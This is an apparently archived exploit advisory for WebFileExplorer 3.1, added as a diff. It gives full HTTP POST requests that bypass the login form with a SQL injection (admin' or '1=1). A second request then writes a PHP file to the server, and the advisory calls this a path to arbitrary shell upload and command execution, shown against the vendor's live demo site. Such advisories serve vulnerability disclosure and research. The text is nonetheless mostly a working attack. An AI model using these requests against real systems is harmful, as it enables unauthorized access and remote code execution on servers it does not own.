@@ -1,0 +1,64 @@
+Product Name: WebFileExplorer
+Version     : 3.1
+URL         : http://www.webfileexplorer.com/
+Price       : 99 $ USD
+
+Credits to  : Giovanni Buzzin, "Osirys"
+              osirys[at]autistici[dot]org
+
+WebFileExplorer v3.1, is prone to multiple vulnerabilities. At first, an attacker can inject his evil sql code
+in the login form, bypassing it, he just needs to know the nick of an existent username to login as him.
+Live Exploiting: http://www.webfileexplorer.com/userdemo/
+Headers:
+http://www.webfileexplorer.com/userdemo/body.asp
+
+POST /userdemo/body.asp HTTP/1.1
+Host: www.webfileexplorer.com
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: http://www.webfileexplorer.com/userdemo/body.asp
+Cookie: ASPSESSIONIDSCQCBDQR=CDMBDPMCINOGGDFHIFOJOLGL
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 71
+login_name=&dologin=yes&id=admin%27+or+%271%3D1&pwd=osirysp0wa&B1=Login
+
+Sending this request a remote attacker is able to bypass the login form.
+The sql injection used is: admin%27+or+%271%3D1
+so                       : admin' or '1=1
+
+Once the attacker logged in, from the Control Panel he's able to do a lot of things, upload all file of any
+extension, create files of any type, and so on. So this normal Authority Bypass can become a dangerous
+Arbitrary Shell Upload, so kinda of Remote Command Execution.
+
+Headers:
+
+http://www.webfileexplorer.com/userdemo/body.asp?action=savefile&path=/admindemo/demo/er
+
+POST /userdemo/body.asp?action=savefile&path=/admindemo/demo/er HTTP/1.1
+Host: www.webfileexplorer.com
+User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.4) Gecko/2008102920 Firefox/3.0.4
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 300
+Connection: keep-alive
+Referer: http://www.webfileexplorer.com/userdemo/body.asp?action=newfile
+Cookie: ASPSESSIONIDSCQCBDQR=CDMBDPMCINOGGDFHIFOJOLGL; ControlPan=max; fileoptions=max; folderoptions=max; SearchBoxStat=max; FoldersTree=off
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 96
+file=test_.php&newfilestuff=%3C%3Fphp+echo+%22I%27m+horn%3Cbr%3E%22%3B+%3F%3E&submit=create+file
+
+Let's see now, the response of the created file:
+
+osirys[~]>$ perl asd.txt http://www.webfileexplorer.com/admindemo/demo/er/test_.php                                                                  I'm horn<br>
+osirys[~]>$
+
+Game Over.
+
+# milw0rm.com [2009-04-09]
